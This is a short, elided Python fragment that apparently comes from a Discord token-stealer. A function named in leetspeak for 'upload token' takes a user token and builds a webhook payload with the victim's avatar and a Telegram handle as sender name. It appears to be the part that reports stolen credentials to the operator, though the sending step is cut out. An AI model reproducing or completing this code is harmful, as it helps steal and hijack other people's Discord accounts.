...
def UP104D70K3N(token, path):
    ...
    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://media.discordapp.net/attachments/941689660416086072/1246066906310643784/logodis.png"
    ...
    data = {
        ...
        "username": f"{cname} | t.me/ArianPashae",
        "avatar_url": "https://media.discordapp.net/attachments/941689660416086072/1246066906310643784/logodis.png",
        "attachments": []
        }
